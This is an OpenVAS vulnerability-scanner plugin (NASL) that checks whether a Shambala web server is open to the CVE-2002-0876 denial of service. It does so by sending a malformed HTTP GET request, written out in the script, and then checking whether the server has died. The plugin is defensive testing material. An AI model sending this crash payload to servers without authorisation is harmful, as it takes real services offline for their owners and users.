# OpenVAS Vulnerability Test
# $Id: shambala_www_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Shambala web server DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CVE
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.10967");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4897);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2002-0876");
 script_name("Shambala web server DoS");

 
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 
 script_family("Denial of Service");
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl", "http_version.nasl", "no404.nasl");
 script_tag(name : "solution" , value : "install a safer server or upgrade it");
 script_tag(name : "summary" , value : "It was possible to kill the web server by
sending a malicious request." );
 exit(0);
}

########
include("http_func.inc");

# " in strings are not great in NASL
req = string("!", raw_string(0x22),"#?%&/()=?");

port = get_http_port(default:80);

if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  soc = http_open_socket(port);
  if(soc)
  {
  data = http_get(item:req, port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
 
  if(http_is_dead(port:port))security_message(port);
  }
}
